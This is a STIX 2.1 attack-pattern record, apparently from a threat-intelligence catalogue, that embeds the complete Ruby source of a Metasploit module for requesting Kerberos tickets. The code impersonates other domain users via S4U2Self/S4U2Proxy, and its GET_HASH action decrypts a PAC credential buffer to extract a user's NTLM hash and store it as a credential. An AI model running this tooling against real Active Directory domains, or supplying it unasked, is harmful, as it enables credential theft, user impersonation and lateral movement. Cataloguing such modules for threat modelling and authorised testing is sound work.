{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ceefb2e5-c42a-4a67-88fc-9160bd64a248",
    "created": "2024-08-14T16:22:58.650411Z",
    "modified": "2024-08-14T16:22:58.650416Z",
    "name": "Kerberos TGT/TGS Ticket Requester",
    "description": " This module requests TGT/TGS Kerberos tickets from the KDC ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/kerberos/get_ticket.rb",
            "external_id": "get_ticket.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Kerberos\n  include Msf::Exploit::Remote::Kerberos::Client\n  include Msf::Exploit::Remote::Kerberos::Ticket::Storage\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kerberos TGT/TGS Ticket Requester',\n        'Description' => %q{\n          This module requests TGT/TGS Kerberos tickets from the KDC\n        },\n        'Author' => [\n          'Christophe De La Fuente', # Metasploit module\n          'Spencer McIntyre', # Metasploit module\n          # pkinit authors\n          'Will Schroeder', # original idea/research\n          'Lee Christensen', # original idea/research\n          'Oliver Lyak', # certipy implementation\n          'smashery' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'AKA' => ['getTGT', 'getST'],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ],\n          'Reliability' => [ ]\n        },\n        'Actions' => [\n          [ 'GET_TGT', { 'Description' => 'Request a Ticket-Granting-Ticket (TGT)' } ],\n          [ 'GET_TGS', { 'Description' => 'Request a Ticket-Granting-Service (TGS)' } ],\n          [ 'GET_HASH', { 'Description' => 'Request a TGS to recover the NTLM hash' } ]\n        ],\n        'DefaultAction' => 'GET_TGT'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [ false, 'The Fully Qualified Domain Name (FQDN). Ex: mydomain.local' ]),\n        OptString.new('USERNAME', [ false, 'The domain user' ]),\n        OptString.new('PASSWORD', [ false, 'The domain user\\'s password' ]),\n        OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),\n        OptString.new('CERT_PASSWORD', [ false, 'The certificate file\\'s password' ]),\n        OptString.new(\n          'NTHASH', [\n            false,\n            'The NT hash in hex string. Server must support RC4'\n          ]\n        ),\n        OptString.new(\n          'AES_KEY', [\n            false,\n            'The AES key to use for Kerberos authentication in hex string. Supported keys: 128 or 256 bits'\n          ]\n        ),\n        OptString.new(\n          'SPN', [\n            false,\n            'The Service Principal Name, format is service_name/FQDN. Ex: cifs/dc01.mydomain.local'\n          ],\n          conditions: %w[ACTION == GET_TGS]\n        ),\n        OptString.new(\n          'IMPERSONATE', [\n            false,\n            'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',\n          ],\n          conditions: %w[ACTION == GET_TGS]\n        ),\n        OptPath.new(\n          'Krb5Ccname', [\n            false,\n            'The Kerberos TGT to use when requesting the service ticket. If unset, the database will be checked'\n          ],\n          conditions: %w[ACTION == GET_TGS]\n        ),\n      ]\n    )\n\n    deregister_options('KrbCacheMode')\n  end\n\n  def validate_options\n    if datastore['CERT_FILE'].present?\n      certificate = File.read(datastore['CERT_FILE'])\n      begin\n        @pfx = OpenSSL::PKCS12.new(certificate, datastore['CERT_PASSWORD'] || '')\n      rescue OpenSSL::PKCS12::PKCS12Error => e\n        fail_with(Failure::BadConfig, \"Unable to parse certificate file (#{e})\")\n      end\n\n      if datastore['USERNAME'].blank? && datastore['DOMAIN'].present?\n        fail_with(Failure::BadConfig, 'Domain override provided but no username override provided (must provide both or neither)')\n      elsif datastore['DOMAIN'].blank? && datastore['USERNAME'].present?\n        fail_with(Failure::BadConfig, 'Username override provided but no domain override provided (must provide both or neither)')\n      end\n\n      begin\n        @username, @realm = extract_user_and_realm(@pfx.certificate, datastore['USERNAME'], datastore['DOMAIN'])\n      rescue ArgumentError => e\n        fail_with(Failure::BadConfig, e.message)\n      end\n    else # USERNAME and DOMAIN are required when they can't be extracted from the certificate\n      @username = datastore['USERNAME']\n      fail_with(Failure::BadConfig, 'USERNAME must be specified when used without a certificate') if @username.blank?\n\n      @realm = datastore['DOMAIN']\n      fail_with(Failure::BadConfig, 'DOMAIN must be specified when used without a certificate') if @realm.blank?\n    end\n\n    if datastore['NTHASH'].present? && !datastore['NTHASH'].match(/^\\h{32}$/)\n      fail_with(Failure::BadConfig, 'NTHASH must be a hex string of 32 characters (128 bits)')\n    end\n\n    if datastore['AES_KEY'].present? && !datastore['AES_KEY'].match(/^(\\h{32}|\\h{64})$/)\n      fail_with(Failure::BadConfig,\n                'AES_KEY must be a hex string of 32 characters for 128-bits AES keys or 64 characters for 256-bits AES keys')\n    end\n\n    if action.name == 'GET_TGS' && datastore['SPN'].blank?\n      fail_with(Failure::BadConfig, \"SPN must be provided when action is #{action.name}\")\n    end\n\n    if action.name == 'GET_HASH' && datastore['CERT_FILE'].blank?\n      fail_with(Failure::BadConfig, \"CERT_FILE must be provided when action is #{action.name}\")\n    end\n\n    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})\n      fail_with(Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')\n    end\n  end\n\n  def run\n    validate_options\n\n    send(\"action_#{action.name.downcase}\")\n\n    report_service(\n      host: rhost,\n      port: rport,\n      proto: 'tcp',\n      name: 'kerberos',\n      info: \"Module: #{fullname}, KDC for domain #{@realm}\"\n    )\n  rescue ::Rex::ConnectionError => e\n    elog('Connection error', error: e)\n    fail_with(Failure::Unreachable, e.message)\n  rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,\n         ::EOFError => e\n    msg = e.to_s\n    if e.respond_to?(:error_code) &&\n       e.error_code == ::Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED\n      msg << ' - Check the authentication-related options (Krb5Ccname, PASSWORD, NTHASH or AES_KEY)'\n    end\n    fail_with(Failure::Unknown, msg)\n  end\n\n  def init_authenticator(options = {})\n    options.merge!({\n      host: rhost,\n      realm: @realm,\n      username: @username,\n      pfx: @pfx,\n      framework: framework,\n      framework_module: self\n    })\n    options[:password] = datastore['PASSWORD'] if datastore['PASSWORD'].present?\n    if datastore['NTHASH'].present?\n      options[:key] = [datastore['NTHASH']].pack('H*')\n      options[:offered_etypes] = [ Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC ]\n    end\n    if datastore['AES_KEY'].present?\n      options[:key] = [ datastore['AES_KEY'] ].pack('H*')\n      options[:offered_etypes] = if options[:key].size == 32\n                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES256 ]\n                                 else\n                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES128 ]\n                                 end\n    end\n\n    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)\n  end\n\n  def action_get_tgt\n    print_status(\"#{peer} - Getting TGT for #{@username}@#{@realm}\")\n\n    # Never attempt to use the kerberos cache when requesting a kerberos TGT, to ensure a request is made\n    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })\n    authenticator.request_tgt_only\n  end\n\n  def action_get_tgs\n    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: true, write: true) })\n    tgt_request_options = {}\n    if datastore['Krb5Ccname'].present?\n      tgt_request_options[:cache_file] = datastore['Krb5Ccname']\n    end\n    credential = authenticator.request_tgt_only(tgt_request_options)\n\n    if datastore['IMPERSONATE'].present?\n      print_status(\"#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})\")\n\n      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(\n        name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,\n        name_string: [@username]\n      )\n      auth_options = {\n        sname: sname,\n        impersonate: datastore['IMPERSONATE']\n      }\n      tgs_ticket, _tgs_auth = authenticator.s4u2self(\n        credential,\n        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))\n      )\n\n      auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(\n        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,\n        name_string: datastore['SPN'].split('/')\n      )\n      auth_options[:tgs_ticket] = tgs_ticket\n      authenticator.s4u2proxy(credential, auth_options)\n    else\n      print_status(\"#{peer} - Getting TGS for #{@username}@#{@realm} (SPN: #{datastore['SPN']})\")\n\n      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(\n        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,\n        name_string: datastore['SPN'].split('/')\n      )\n      tgs_options = {\n        sname: sname,\n        ticket_storage: kerberos_ticket_storage(read: false)\n      }\n\n      authenticator.request_tgs_only(credential, tgs_options)\n    end\n  end\n\n  def action_get_hash\n    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })\n    auth_context = authenticator.authenticate_via_kdc(options)\n    credential = auth_context[:credential]\n\n    print_status(\"#{peer} - Getting NTLM hash for #{@username}@#{@realm}\")\n\n    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(\n      type: credential.keyblock.enctype.value,\n      value: credential.keyblock.data.value\n    )\n\n    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)\n\n    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(\n      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)\n    )\n    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value\n    pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)\n    pac_info_buffer = pac.pac_info_buffers.find do |buffer|\n      buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION\n    end\n    unless pac_info_buffer\n      print_error('NTLM hash not found in PAC')\n      return\n    end\n\n    serialized_pac_credential_data = pac_info_buffer.buffer.pac_element.decrypt_serialized_data(auth_context[:krb_enc_key][:key])\n    ntlm_hash = serialized_pac_credential_data.data.extract_ntlm_hash\n    print_good(\"Found NTLM hash for #{@username}: #{ntlm_hash}\")\n\n    report_ntlm(ntlm_hash)\n  end\n\n  def report_ntlm(hash)\n    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'kerberos',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :ntlm_hash,\n      jtr_format: jtr_format,\n      username: @username,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: @realm\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}